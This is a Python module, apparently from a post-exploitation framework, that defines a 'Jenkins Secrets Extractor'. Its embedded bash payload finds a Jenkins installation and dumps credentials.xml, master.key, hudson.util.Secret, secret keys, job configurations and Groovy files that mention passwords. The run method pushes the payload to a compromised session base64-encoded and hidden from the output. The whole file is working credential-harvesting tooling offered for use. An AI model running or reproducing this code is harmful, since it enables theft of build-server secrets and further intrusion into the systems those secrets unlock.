"""Jenkins secrets extractor."""

from ..base import OperatorScript, ScriptResult


class JenkinsSecrets(OperatorScript):
    """Extract and decrypt Jenkins credentials."""
    
    name = "Jenkins Secrets Extractor"
    description = "Extract Jenkins credentials, keys, and secrets"
    category = "harvest"
    
    def get_payload(self) -> str:
        return """#!/bin/bash
echo "[*] JENKINS SECRETS EXTRACTOR"
echo "============================="
echo ""

echo "[*] Locating Jenkins home..."
JENKINS_HOME=$(find / -name "config.xml" -path "*/jenkins/*" 2>/dev/null | head -1 | xargs dirname 2>/dev/null)

if [ -z "$JENKINS_HOME" ]; then
    JENKINS_HOME="/var/lib/jenkins"
fi

if [ -d "$JENKINS_HOME" ]; then
    echo "[+] Jenkins home: $JENKINS_HOME"
else
    echo "[-] Jenkins home not found"
    exit 0
fi
echo ""

echo "[+] Credentials XML:"
find "$JENKINS_HOME" -name "credentials.xml" 2>/dev/null | while read file; do
    echo "[!] $file"
    ls -la "$file"
    echo "Content (first 500 bytes):"
    head -c 500 "$file"
    echo ""
done

echo "[+] Master key:"
find "$JENKINS_HOME" -name "master.key" 2>/dev/null | while read file; do
    echo "[!] $file"
    ls -la "$file"
    cat "$file" 2>/dev/null | base64
done
echo ""

echo "[+] Hudson secret:"
find "$JENKINS_HOME" -name "hudson.util.Secret" 2>/dev/null | while read file; do
    echo "[!] $file"
    ls -la "$file"
    hexdump -C "$file" | head -5
done
echo ""

echo "[+] Secret keys:"
find "$JENKINS_HOME" -name "secret.key" -o -name "secret.key.not-so-secret" 2>/dev/null | while read file; do
    echo "[!] $file"
    ls -la "$file"
done
echo ""

echo "[+] Identity key (Jenkins agent):"
find "$JENKINS_HOME" -name "identity.key.enc" 2>/dev/null
echo ""

echo "[+] Job configurations (may contain secrets):"
find "$JENKINS_HOME/jobs" -name "config.xml" 2>/dev/null | head -10
echo ""

echo "[+] Searching for hardcoded passwords in Groovy scripts:"
find "$JENKINS_HOME" -name "*.groovy" 2>/dev/null -exec grep -l "password\\|secret\\|token" {} \\; | head -10
"""
    
    def run(self, session_meta, send_command_func, output_func) -> ScriptResult:
        try:
            output_func("[bold cyan][*] Extracting Jenkins secrets...[/bold cyan]")
            
            payload = self.get_payload()
            import base64
            encoded = base64.b64encode(payload.encode()).decode('ascii')
            send_command_func(f"echo '{encoded}' | base64 -d | bash", show_in_output=False)
            
            output_func("[dim]Attempting to decrypt with jenkins_decrypt module...[/dim]")
            
            return ScriptResult(success=True, output="Jenkins secrets extraction executed")
        except Exception as e:
            return ScriptResult(success=False, output="", error=str(e))
